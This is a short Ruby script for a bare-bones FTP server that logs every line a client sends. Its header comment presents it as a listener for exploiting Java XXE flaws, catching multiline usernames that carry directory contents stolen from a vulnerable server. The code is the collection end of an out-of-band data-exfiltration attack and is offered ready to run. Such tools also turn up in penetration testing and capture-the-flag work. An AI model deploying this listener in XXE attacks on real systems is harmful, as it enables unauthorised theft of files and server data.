# ####################################################
# This FTP server just prints out whatever is sent to it.
# It's very handy for exploiting Java XXE and sending
# multiline username to exfiltrate directory contents.
# #####################################################

require 'socket'
server = TCPServer.new("127.0.0.1", 21) 

loop do
    Thread.start(server.accept) do |client|
        puts "New connection from: #{client.addr[2]}"
        client.puts("220 FTP Server")

        loop {
	    req = client.gets()
	    puts req

            if req.index(/^USER /) === 0
                client.puts("331 USER OK")
            else
                client.puts("230 USER LOGGED IN")
            end

	    # uncomment to enable logging to file
            # File.open('ftp.log', 'a') {|f| f.write(req) }
        }          
    end
end
